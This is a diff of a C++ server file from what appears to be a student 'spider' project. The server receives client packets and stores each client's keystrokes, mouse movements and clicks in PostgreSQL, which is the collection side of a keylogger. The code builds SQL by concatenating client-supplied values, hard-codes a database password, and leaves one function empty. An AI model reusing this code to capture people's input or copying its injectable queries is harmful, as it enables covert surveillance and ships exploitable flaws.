@@ -5,16 +5,31 @@
 // Login   <debrab_t@epitech.net>
 //
 // Started on  Mon Nov  7 10:23:09 2016 debrab_t
-// Last update Wed Nov  9 16:34:19 2016 debrab_t
+// Last update Sun Nov 13 14:12:11 2016 debrab_t
 //
+
+/*
+  TODO
+
+  - appeler close quand un client ce deconnect du serv
+  - reponse des clickmouse, key...
+  - reponse sizeof(PackageHeader) + sizeof(PackageAnswer) ?
+  - verifier char to string, faire une copy correct du nombre de caractère !!!
+*/
 
 #include "socket/serverTcpSocket.hpp"
 
 SqlServer::SqlServer()
 {
   feedPointMap();
-  dbConnect("dbname=postgres user=postgres password=abcd hostaddr=127.0.0.1 port=5432");
-  createServTab();
+  if (dbConnect("dbname=postgres user=postgres password=abcd hostaddr=127.0.0.1 port=5432"))
+    {
+      _cnt = true;
+      createServTab();
+      sqlMan.updateData("client", "state = FALSE");
+    }
+  else
+    _cnt = false;
 }
 
 SqlServer::~SqlServer()
@@ -33,119 +48,234 @@ void	SqlServer::createServTab()
   sqlMan.createTable("CLIENT",
 		     "ID  SERIAL PRIMARY KEY,"		\
 		     "ID_CLIENT	INT NOT NULL,"		\
-		     "PUBLICKEY TEXT NOT NULL");
+		     "PUBLICKEY TEXT NOT NULL,"		\
+		     "STATE BOOL NOT NULL");
   sqlMan.createTable("MOUSE_MOUVEMENT",
 		     "ID  SERIAL PRIMARY KEY,"		      \
 		     "ID_CLIENT INT NOT NULL,"		      \
-		     "TIMESTAMP TEXT NOT NULL,"		      \
+		     "TIMESTAMP INT NOT NULL,"		      \
 		     "X INT NOT NULL,"			      \
 		     "Y INT NOT NULL");
   sqlMan.createTable("MOUSE_CLICK",
 		     "ID  SERIAL PRIMARY KEY,"		      \
 		     "ID_CLIENT INT NOT NULL,"		      \
-		     "TIMESTAMP TEXT NOT NULL,"		      \
+		     "TIMESTAMP INT NOT NULL,"		      \
 		     "X INT NOT NULL,"			      \
 		     "Y INT NOT NULL,"			      \
-		     "ID_CLICK INT NOT NULL");
+		     "ID_CLICK TEXT NOT NULL");
   sqlMan.createTable("KEYBOARD_STRING",
 		     "ID  SERIAL PRIMARY KEY,"	\
 		     "ID_CLIENT INT NOT NULL,"	\
-		     "STRING TEXT NOT NULL");
+		     "TIMESTAMP INT NOT NULL,"	\
+		     "ID_KEYBOARD TEXT NOT NULL");
 }
 
-void		SqlServer::addClient(spider::PacketUnserializer &packet)
+bool		SqlServer::isClient(const std::string &id_client)
 {
-  PackageCMDIDN	idn;
-  std::string	data;
   pqxx::result	reqResult;
 
-  idn = packet.getData<PackageCMDIDN>();
-  data = std::to_string(idn.id) + ", " + "'" + std::string(idn.key) + "'";
-  std::cout << "addClient--->" << data << std::endl;
-  reqResult= sqlMan.selectData("id_client", "client where id_client=" + std::to_string(idn.id));
-  /*  if ()
-  for (pqxx::result::const_iterator c = r.begin(); c != r.end(); ++c)
-    {
-      std::cout << "ID = " << c[0] << std::endl;
-      }*/
-  sqlMan.insertData("CLIENT",
-		    "ID_CLIENT, PUBLICKEY",
-		    data);
+  reqResult = sqlMan.selectData("id_client", "client where id_client=" + id_client);
+  pqxx::result::const_iterator c = reqResult.begin();
+  if (c == reqResult.end())
+    return (false);
+  return (true);
 }
 
-void	SqlServer::addMouseMouvement(spider::PacketUnserializer &packet)
+bool		SqlServer::isClientState(const std::string &id_client)
+{
+  pqxx::result	reqResult;
+
+  reqResult = sqlMan.selectData("state", "client where id_client=" + id_client);
+  pqxx::result::const_iterator c = reqResult.begin();
+  if (c != reqResult.end() && std::string("t").compare(c[0].as<std::string>()) == 0)
+    return (true);
+  return (false);
+}
+
+bool		SqlServer::connectClient(spider::PacketUnserializer &packet)
+{
+  PackageCMDIDN	idn;
+  PackageHeader	hea;
+  std::string	data;
+  std::string	id_client;
+
+  idn = packet.getData<PackageCMDIDN>();
+  hea = packet.getHeader();
+  if (hea.magicNumber != SEND)
+    {
+      std::cerr << "Try to connect client but magic number is false..." << std::endl;
+      return (false);
+    }
+  id_client = std::to_string(hea.id);
+  data = id_client + ", '" + std::string(idn.key) + "', " + "TRUE";
+  if (!isClient(id_client))
+    {
+      sqlMan.insertData("CLIENT",
+			"ID_CLIENT, PUBLICKEY, STATE",
+			data);
+      return (true);
+    }
+  else if (isClient(id_client) && !isClientState(id_client))
+    {
+      sqlMan.updateData("CLIENT", "STATE=TRUE WHERE id_client=" + id_client);
+      return (true);
+    }
+  return (false);
+}
+
+bool	SqlServer::addMouseMouvement(spider::PacketUnserializer &packet)
 {
   PackageCMDMouseMove	mvt;
+  PackageHeader		hea;
+  std::string		data;
+  std::string		id_client;
 
   mvt = packet.getData<PackageCMDMouseMove>();
-  sqlMan.insertData("MOUSE_MOUVEMENT",
-		    "ID_CLIENT, TIMESTAMP, X, Y",
-		    "1, 'timestamp test', 8, 2");
+  hea = packet.getHeader();
+  if (hea.magicNumber != SEND)
+    {
+      std::cerr << "Try to add mouse mouvement but magic number is false..." << std::endl;
+      return (false);
+    }
+  id_client = std::to_string(hea.id);
+  data = id_client +
+    ", " + std::to_string(mvt.timestamp) +
+    ", " + std::to_string(mvt.x) +
+    ", " + std::to_string(mvt.y);
+  if (isClient(id_client) && isClientState(id_client))
+    {
+      HandleFileServer	tst;
+      std::map<HandleData::column, std::string> mapTst;
+
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::tmeStampMVT, std::to_string(mvt.timestamp)));
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::xMVT, std::to_string(mvt.x)));
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::yMVT, std::to_string(mvt.y)));
+      tst.insertDataClient(hea.id, mapTst);
+      sqlMan.insertData("MOUSE_MOUVEMENT",
+			"ID_CLIENT, TIMESTAMP, X, Y",
+			data);
+      return (true);
+    }
+  return (false);
 }
 
-void	SqlServer::addMouseClick(spider::PacketUnserializer &packet)
+bool			SqlServer::addMouseClick(spider::PacketUnserializer &packet)
 {
-  PackageCMDMouseClic clc;
+  PackageCMDMouseClic	clc;
+  PackageHeader		hea;
+  std::string		data;
+  std::string		id_client;
 
   clc = packet.getData<PackageCMDMouseClic>();
-  sqlMan.insertData("MOUSE_CLICK",
-		    "ID_CLIENT, TIMESTAMP, X, Y, ID_CLICK",
-		    "1, 'timestamp test', 8, 2, 3");
+  hea = packet.getHeader();
+  if (hea.magicNumber != SEND)
+    {
+      std::cerr << "Try to add mouse click but magic number is false..." << std::endl;
+      return (false);
+    }
+  id_client = std::to_string(hea.id);
+  data = id_client +
+    ", " + std::to_string(clc.timestamp) +
+    ", " + std::to_string(clc.x) +
+    ", " + std::to_string(clc.y) +
+    ", '" + std::string(clc.id) + "'";
+  if (isClient(id_client) && isClientState(id_client))
+    {
+      std::map<HandleData::column, std::string> mapTst;
+
+      sqlMan.insertData("MOUSE_CLICK",
+			"ID_CLIENT, TIMESTAMP, X, Y, ID_CLICK",
+			data);
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::tmeStampCLC, std::to_string(clc.timestamp)));
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::xCLC, std::to_string(clc.x)));
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::yCLC, std::to_string(clc.y)));
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::idCLC, std::string(clc.id)));
+      dataToFile.insertDataClient(hea.id, mapTst);
+      return (true);
+    }
+  return (false);
 }
 
-void	SqlServer::addKeyboardString(spider::PacketUnserializer &packet)
+bool	SqlServer::addKeyboardString(spider::PacketUnserializer &packet)
 {
   PackageCMDKeyboardTouch	toc;
+  PackageHeader		hea;
+  std::string		data;
+  std::string		id_client;
 
   toc = packet.getData<PackageCMDKeyboardTouch>();
-  sqlMan.insertData("KEYBOARD_STRING",
-		    "ID_CLIENT, STRING",
-		    "1, 'string test'");
+  hea = packet.getHeader();
+  if (hea.magicNumber != SEND)
+    {
+      std::cerr << "Try to add keyboard string but magic number is false..." << std::endl;
+      return (false);
+    }
+  id_client = std::to_string(hea.id);
+  data = id_client +
+    ", " + std::to_string(toc.timestamp) +
+    ", '" + strMan.insertStringAfterChar(std::string(toc.id), '\'', "'") + "'";
+  if (isClient(id_client) && isClientState(id_client))
+    {
+      std::map<HandleData::column, std::string> mapTst;
+      sqlMan.insertData("KEYBOARD_STRING",
+			"ID_CLIENT, TIMESTAMP, ID_KEYBOARD",
+			data);
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::tmeStampTOC, std::to_string(toc.timestamp)));
+      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::idTOC, std::string(toc.id)));
+      dataToFile.insertDataClient(hea.id, mapTst);
+      return (true);
+    }
+  return (false);
 }
+
+bool				SqlServer::response(spider::PacketUnserializer &packet)
+{
+  PackageAnswer			ans;
+  PackageHeader			hea;
+  std::string			id_client;
+
+  ans = packet.getData<PackageAnswer>();
+  hea = packet.getHeader();
+  if (hea.magicNumber != REC)
+    {
+      std::cerr << "Response of client but magic number is false..." << std::endl;
+      return (false);
+    }
+  std::cout << ans.msg << std::endl;
+  return (true);
+}
+
+bool				SqlServer::disconnectClient(spider::PacketUnserializer &packet)
+{
+
+}
+
 
 void	SqlServer::feedPointMap()
 {
-  _pointMap.insert(std::pair<std::string,bddFunc>("idn", &SqlServer::addClient));
+  _pointMap.insert(std::pair<std::string,bddFunc>("idn", &SqlServer::connectClient));
   _pointMap.insert(std::pair<std::string,bddFunc>("clc", &SqlServer::addMouseClick));
   _pointMap.insert(std::pair<std::string,bddFunc>("mvt", &SqlServer::addMouseMouvement));
   _pointMap.insert(std::pair<std::string,bddFunc>("toc", &SqlServer::addKeyboardString));
   _pointMap.insert(std::pair<std::string,bddFunc>("dec",  &SqlServer::disconnectClient));
+  _pointMap.insert(std::pair<std::string,bddFunc>("shu",  &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("tal",  &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("pin",  &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("sin",  &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("nor",  &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("mod",  &SqlServer::response));
 }
 
-void	SqlServer::disconnectClient(spider::PacketUnserializer &packet)
+bool		SqlServer::handleData(spider::PacketUnserializer &packet, std::shared_ptr<spider::socket::user> usr)
 {
-
-}
-
-bool		SqlServer::putIntoBdd(spider::PacketUnserializer &packet,
-				      std::shared_ptr<spider::socket::user> user)
-{
-  /*
-  Test msg;
-  memset(&msg.str[0], 0, 100);
-  std::strncpy(msg.cmd, "tst", 3);
-  spider::PacketSerializer<Test> _packet(sizeof(PackageHeader) + sizeof(Test), 1999888256, msg);
-
-  user->write<Test>(_packet);
-  */
-
-
-  /*
-    TODO
-    les structures sont-elles verifié ?
-
-    - connection initialisation
-    - methode disconnect client
-    - verifier à chaque fois que l'id existe (return false si non)
-    - write les réponses de retour (add user remplir le packageAnswer avec la cmd)
-    - verifier les const dans les methodes
-    - mettre les cliens à STATE = FALSE quand ils sont déconnecté si le serveur se quite
-    - creer database s'il elle n'existe pas
-  */
   std::string	stringPacket(packet.getPacketType(), 0, 3);
-  if (_pointMap.find(stringPacket) != _pointMap.end())
-    {
-      ((*this).*_pointMap.find(stringPacket)->second)(packet);
-    }
-  return (true);
+  bool		ret = false;
+
+  _user = usr;
+  strMan.toLowerCase(stringPacket);
+  if (!_cnt)
+    return (false);
+  else if (_pointMap.find(stringPacket) != _pointMap.end())
+    ret = ((*this).*_pointMap.find(stringPacket)->second)(packet);
+  return (ret ? true : disconnectClient(packet));
 }
